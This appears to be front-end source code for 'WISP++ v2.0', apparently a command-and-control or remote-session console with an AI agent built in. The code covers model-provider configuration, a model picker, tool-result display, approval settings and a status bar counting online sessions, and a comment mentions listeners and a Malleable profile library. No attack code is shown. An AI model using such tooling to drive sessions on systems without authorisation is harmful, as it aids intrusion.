interface AICfgProfile { name: string; provider: string; endpoint: string; model: string; has_key: boolean; api_key?: string }
interface AICfg { enabled: boolean; active: string; thinking?: string; profiles: AICfgProfile[] }

interface Vendor { key: string; label: string; ep: string; needsKey: boolean; sample: string }
const VENDORS: Vendor[] = [
  { key: 'tokenplan', label: 'TokenPlan (Aliyun MaaS)', ep: 'https://token-plan.cn-beijing.maas.aliyuncs.com/compatible-mode/v1', needsKey: true, sample: 'qwen3.8-flash' },
  { key: 'dashscope', label: 'Model Studio (Aliyun)', ep: 'https://dashscope.aliyuncs.com/compatible-mode/v1', needsKey: true, sample: 'qwen-plus' },
  { key: 'deepseek', label: 'DeepSeek', ep: 'https://api.deepseek.com/v1', needsKey: true, sample: 'deepseek-chat' },
  { key: 'openrouter', label: 'OpenRouter', ep: 'https://openrouter.ai/api/v1', needsKey: true, sample: 'anthropic/claude-sonnet-4.5' },
  { key: 'ollama', label: 'Ollama (local)', ep: 'http://127.0.0.1:11434/v1', needsKey: false, sample: 'qwen3:14b' },
  { key: 'vllm', label: 'vLLM (local)', ep: 'http://127.0.0.1:8000/v1', needsKey: false, sample: 'Qwen/Qwen3-14B' },
  { key: 'custom', label: 'Custom (OpenAI-compat)', ep: '', needsKey: true, sample: '' },
  { key: 'mock', label: 'Mock (offline demo)', ep: '', needsKey: false, sample: 'wispp-mock' },
];
function vendorOf(p: { provider: string; endpoint: string }): Vendor {
  if (p.provider === 'mock') return VENDORS.find((v) => v.key === 'mock')!;
  return VENDORS.find((v) => v.key !== 'mock' && v.ep && p.endpoint === v.ep) ?? VENDORS.find((v) => v.key === 'custom')!;
}

async function getCfg(): Promise<AICfg> {
  return (await apiFetch('/api/config/ai')).json();
}
async function putCfg(c: AICfg): Promise<AICfg> {
  const r = await apiFetch('/api/config/ai', { method: 'PUT', body: JSON.stringify(c) });
  return r.json();
}
async function pickActive(name: string) {
  await apiFetch('/api/config/ai/active', { method: 'POST', body: JSON.stringify({ name }) });
}

function AddModelDialog({ init, onClose, onSaved }: {
  init?: AICfgProfile; onClose: () => void; onSaved: () => void;
}) {
  const { t } = useI18n();
  const editing = !!init;
  const [vKey, setVKey] = useState(init ? vendorOf(init).key : 'tokenplan');
  const v = VENDORS.find((x) => x.key === vKey)!;
  const [ep, setEp] = useState(init?.endpoint ?? v.ep);
  const [key, setKey] = useState('');
  const [model, setModel] = useState(init?.model ?? '');
  const [models, setModels] = useState<string[]>([]);
  const [phase, setPhase] = useState<'idle' | 'loading' | 'ready' | 'error'>('idle');
  const [err, setErr] = useState('');

  const changeVendor = (k: string) => {
    setVKey(k);
    const nv = VENDORS.find((x) => x.key === k)!;
    if (!editing) { setEp(nv.ep); setModel(k === 'mock' ? 'wispp-mock' : ''); setModels([]); setPhase('idle'); }
  };

  const load = async () => {
    if (v.key === 'mock') { setPhase('ready'); setModels(['wispp-mock']); setModel('wispp-mock'); return; }
    setPhase('loading'); setErr('');
    try {
      const q = new URLSearchParams({ endpoint: ep, key, profile: init?.name ?? '' });
      const r = await (await apiFetch(`/api/config/ai/models?${q}`)).json();
      if (r.error) throw new Error(r.error);
      const list: string[] = r.models ?? [];
      setModels(list); setPhase('ready');
      if (!model) setModel(list.find((m) => /flash|plus|turbo|chat|lite/i.test(m)) ?? list[0] ?? '');
    } catch (e) { setErr(String(e)); setPhase('error'); }
  };

  const save = async () => {
    setPhase('loading'); setErr('');
    try {
      const cur = await getCfg();
      const prov = v.key === 'mock' ? 'mock' : 'openai';
      const name = editing ? init!.name : `${model || v.sample || 'model'}@${v.key}`;
      const entry: AICfgProfile = { name, provider: prov, endpoint: ep.trim(), model: model.trim(), has_key: init?.has_key ?? false, api_key: key };
      const profiles = editing ? cur.profiles.map((x) => (x.name === init!.name ? entry : x)) : [...cur.profiles, entry];
      const saved = await putCfg({ ...cur, profiles });
      await pickActive(name);
      onSaved();
      return saved;
    } catch (e) { setErr(String(e)); setPhase('error'); }
  };

  return (
    <div className="mdl-mask" onMouseDown={onClose}>
      <div className="mdl" onMouseDown={(e) => e.stopPropagation()}>
        <div className="mdl-hd">{editing ? t('editModel') : t('addModelT')}<span className="mdl-x" onClick={onClose}>✕</span></div>
        <div className="mdl-body">
          <label>{T("mdlVendor")}</label>
          <select value={vKey} disabled={editing} onChange={(e) => changeVendor(e.target.value)}>
            {VENDORS.map((x) => <option key={x.key} value={x.key}>{x.label}</option>)}
          </select>
          {vKey !== 'mock' && (<>
            <label>API Endpoint</label>
            <input value={ep} placeholder={v.ep} onChange={(e) => setEp(e.target.value)} />
            {v.needsKey && <><label>API Key</label>
              <input type="password" placeholder={editing && init?.has_key ? T('keySavedPh') : 'sk-…'}
                value={key} onChange={(e) => setKey(e.target.value)} /></>}
            {v.key === 'ollama' || v.key === 'vllm' ? <p className="mdl-note">{T("localNoKey")}</p> : null}
            <div className="mdl-row">
              <button className="p" disabled={phase === 'loading' || !ep} onClick={load}>
                {phase === 'loading' ? T('connWord') : T('verifyFetch')}
              </button>
              {phase === 'error' && <span className="mdl-err">{err}</span>}
              {phase === 'ready' && <span className="mdl-ok">{T('modelsOk', { n: models.length })}</span>}
            </div>
            <label>{T("mdlWord")}</label>
            {models.length > 0 ? (
              <select value={models.includes(model) ? model : ''} onChange={(e) => setModel(e.target.value)}>
                <option value="" disabled>{T("pickFromList")}</option>
                {models.map((m) => <option key={m} value={m}>{m}</option>)}
              </select>
            ) : null}
            <input value={model} placeholder={T("typeModelPh")} onChange={(e) => setModel(e.target.value)} />
          </>)}
        </div>
        <div className="mdl-ft">
          <button className="g" onClick={onClose}>{T("cancelWord")}</button>
          <button className="p" disabled={phase === 'loading' || (!model && v.key !== 'mock')} onClick={save}>
            {editing ? T('saveWord') : T('saveUse')}
          </button>
        </div>
      </div>
    </div>
  );
}

function ModelPicker({ onChanged }: { onChanged?: () => void }) {
  const { t } = useI18n();
  const [cfg, setCfg] = useState<AICfg | null>(null);
  const [open, setOpen] = useState(false);
  const [pos, setPos] = useState<{ left: number; bottom: number }>({ left: 0, bottom: 0 });
  const [dlg, setDlg] = useState<{ mode: 'add' } | { mode: 'edit'; p: AICfgProfile } | null>(null);
  const ref = useRef<HTMLDivElement>(null);
  const refresh = () => getCfg().then(setCfg).catch(() => setCfg(null));
  useEffect(() => { refresh(); return () => { /* noop */ }; }, []);
  useEffect(() => {
    if (!open) return;
    const away = (e: MouseEvent) => {
      const t = e.target as Node;
      if (ref.current?.contains(t) || (t instanceof Element && t.closest('.mp-pop'))) return;
      setOpen(false);
    };
    window.addEventListener('mousedown', away);
    return () => window.removeEventListener('mousedown', away);
  }, [open]);
  const toggle = () => {
    if (!open && ref.current) {
      const r = ref.current.getBoundingClientRect();
      setPos({
        left: Math.max(8, Math.min(r.left, window.innerWidth - 288)),
        bottom: Math.max(8, window.innerHeight - r.top + 6),
      });
    }
    setOpen((x) => !x);
  };

  const cur = cfg?.profiles.find((p) => p.name === cfg.active);
  const choose = async (name: string) => { await pickActive(name); setOpen(false); refresh(); onChanged?.(); };
  const del = async (p: AICfgProfile) => {
    if (!confirm(t('removeModelConfirm').replace('{m}', p.model || p.name))) return;
    const c = await getCfg();
    await putCfg({ ...c, profiles: c.profiles.filter((x) => x.name !== p.name) });
    refresh(); onChanged?.();
  };

  return (
    <div className="mp" ref={ref}>
      <button className="mp-btn" onClick={toggle} title={T("pickModel")}>
        {cur ? (vendorOf(cur).key === 'mock' ? '🧪 ' : '● ') : ''}{cur?.model || T('pickModel')}<span>▾</span>
      </button>
      {open && (
        <div className="mp-pop" style={{ position: 'fixed', left: pos.left, bottom: pos.bottom, top: 'auto', right: 'auto' }}>
          {!cfg?.enabled && <div className="mp-off">{T('mpOff')}<br /><button className="p" onClick={async () => { const c = await getCfg(); await putCfg({ ...c, enabled: true }); refresh(); onChanged?.(); }}>{T("enableWord")}</button></div>}
          {cfg?.profiles.map((p) => {
            const vd = vendorOf(p);
            return (
              <div key={p.name} className={`mp-item${p.name === cfg.active ? ' on' : ''}`}>
                <div className="mp-main" onClick={() => void choose(p.name)}>
                  <span className="mp-model">{p.model || p.name}</span>
                  <span className="mp-vendor">{vd.label}</span>
                </div>
                <span className="mp-act" title={T("editWord")} onClick={() => setDlg({ mode: 'edit', p })}>✎</span>
                <span className="mp-act" title={T("removeWord")} onClick={() => void del(p)}>🗑</span>
              </div>
            );
          })}
          <div className="mp-add" onClick={() => setDlg({ mode: 'add' })}>{t('addModel')}</div>
        </div>
      )}
      {dlg && <AddModelDialog init={dlg.mode === 'edit' ? dlg.p : undefined} onClose={() => setDlg(null)}
        onSaved={() => { setDlg(null); refresh(); onChanged?.(); }} />}
    </div>
  );
}

const THINKS: [string, string][] = [['off', 'thinkOff'], ['minimal', 'thinkMinimal'], ['low', 'thinkLow'], ['medium', 'thinkMedium'], ['high', 'thinkHigh'], ['', 'thinkAuto']];

function ThinkSelect() {
  const [v, setV] = useState('');
  useEffect(() => {
    getCfg().then((c) => setV(c.thinking ?? '')).catch(() => {});
  }, []);
  const change = async (nv: string) => {
    setV(nv);
    const c = await getCfg();
    await putCfg({ ...c, thinking: nv });
  };
  return (
    <select className="think-sel" value={v} title="reasoning effort"
      onChange={(e) => void change(e.target.value)}>
      {THINKS.map(([k, l]) => <option key={k} value={k}>{useI18n.getState().t(l)}</option>)}
    </select>
  );
}


// ================= 监听器管理（含 Malleable profile 库） =================


function ToolCard({ name, content, ok }: { name: string; content: string; ok: boolean }) {
  const [open, setOpen] = useState(false);
  let parsed: unknown = null;
  try { parsed = JSON.parse(content); } catch { /* plain */ }
  const arr = Array.isArray(parsed) ? (parsed as Record<string, unknown>[]) : null;
  const rows = arr && arr.length && typeof arr[0] === 'object' ? arr : null;
  const cols = rows ? Object.keys(rows[0]).slice(0, 4) : [];
  return (
    <div className="tool">
      <div className="tool-hd" onClick={() => rows && setOpen((x) => !x)} style={rows ? { cursor: 'pointer' } : undefined}>
        🔧 {name}<span className="ok-ic">{ok ? useI18n.getState().t('toolDone') : useI18n.getState().t('toolFail')}</span>
      </div>
      {rows ? (
        open ? (
          <table className="tool-t"><tbody>
            {rows.slice(0, 12).map((r, i) => (
              <tr key={i}>{cols.map((c) => <td key={c} className="mono">{String(r[c] ?? '').slice(0, 22)}</td>)}</tr>
            ))}
          </tbody></table>
        ) : (
          <div className="tool-sum">{rows.length} {useI18n.getState().t('nResults')}</div>
        )
      ) : (
        <pre>{content.slice(0, 300)}</pre>
      )}
    </div>
  );
}

function SettingsModal({ onClose }: { onClose: () => void }) {
  useEffect(() => {
    const esc = (e: KeyboardEvent) => { if (e.key === 'Escape') onClose(); };
    window.addEventListener('keydown', esc);
    return () => window.removeEventListener('keydown', esc);
  }, [onClose]);
  return (
    <div className="set-mask" onMouseDown={onClose}>
      <div className="set-modal" onMouseDown={(e) => e.stopPropagation()}>
        <SettingsBody onClose={onClose} />
      </div>
    </div>
  );
}

function SettingsBody({ onClose }: { onClose: () => void }) {
  const { t } = useI18n();
  const [cfg, setCfg] = useState<AICfg | null>(null);
  const [dlg, setDlg] = useState<null | { mode: 'add' } | { mode: 'edit'; p: AICfgProfile }>(null);
  const refresh = () => getCfg().then(setCfg).catch(() => {});
  useEffect(() => { refresh(); }, []);
  if (!cfg) return <div className="console"><div className="c-out muted">{useI18n.getState().t('loadingCfg')}</div></div>;
  return (
    <div className="settings">
      <div className="set-head"><b>{t('gateTitle')}</b><span className="mdl-x" style={{ marginLeft: 'auto' }} onClick={onClose}>✕</span></div>
      <div className="set-body">
        <section>
          <h3>{t('aiModelSec')}</h3>
          <p className="set-hint">{t('aiModelHint')}</p>
          <div className="mp-list">
            {cfg.profiles.map((p) => {
              const vd = vendorOf(p);
              return (
                <div key={p.name} className="mp-item">
                  <div className="mp-main">
                    <span className="mp-model">{p.name === cfg.active ? '★ ' : ''}{p.model || p.name}</span>
                    <span className="mp-vendor">{vd.label}{p.has_key ? ' · key ✓' : ` · ${t('noKey')}`}</span>
                  </div>
                  <span className="mp-act" onClick={() => setDlg({ mode: 'edit', p })}>✎</span>
                  <span className="mp-act" onClick={async () => { if (p.name !== cfg.active) { await pickActive(p.name); refresh(); } }}>★</span>
                </div>
              );
            })}
            <div className="mp-add" onClick={() => setDlg({ mode: 'add' })}>{t('addModel')}</div>
          </div>
          <div className="set-actions">
            <label className="tgl-wrap"><input type="checkbox" checked={cfg.enabled}
              onChange={async (e) => { await putCfg({ ...cfg, enabled: e.target.checked }); refresh(); }} />
              <i></i><span>{t('enableAI')}</span></label>
          </div>
        </section>
        <section>
          <h3>{t('approvalSec')}</h3>
          <p className="set-hint">{t('approvalHint')}</p>
        </section>
      </div>
      {dlg && <AddModelDialog init={dlg.mode === 'edit' ? dlg.p : undefined} onClose={() => setDlg(null)}
        onSaved={() => { setDlg(null); refresh(); }} />}
    </div>
  );
}

function StatusBar() {
  const { t } = useI18n();
  const { sessions, sseUp, error } = useStore();
  const [ai, setAi] = useState<{ enabled: boolean; active?: string; pending?: number } | null>(null);
  useEffect(() => {
    const f = () => fetch('/api/ai/status', { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '' } })
      .then((r) => r.json()).then(setAi).catch(() => {});
    f();
    const t = setInterval(f, 15000);
    return () => clearInterval(t);
  }, []);
  return (
    <div className="statusbar">
      <div className="item">{sseUp ? t('sseOn') : t('sseOff')}</div>
      <div className="item">{t('sessWord')} {sessions.length} ({sessions.filter((x) => x.status === 'online').length} {t('onlineWord')})</div>
      <ProxyChip />
      <span className="spacer" />
      {ai?.pending ? (
        <div className="item sb-item" onClick={() => document.querySelector<HTMLElement>('.ai .ai-hd')?.dispatchEvent(new MouseEvent('click', { bubbles: true }))}>
          <span className="sb-pulse" /> {t('pendingApproval')} {ai.pending}
        </div>
      ) : null}
      {ai?.enabled && <div className="item" title={ai.active}>{(ai.active ?? '').split('@')[0].slice(0, 22)}</div>}
      {error && <div className="item err">{error}</div>}
      <button className="lang-btn" title="中 / EN" onClick={() => useI18n.getState().toggle()}>{t('langBtn')}</button>
      <button className="theme-btn" title={T('themeBtn')} onClick={() => useStore.getState().toggleTheme()}>{useStore((s) => s.theme) === 'dark' ? '☀' : '🌙'}</button>
      <div className="item">WISP++ v2.0</div>
    </div>
  );
}
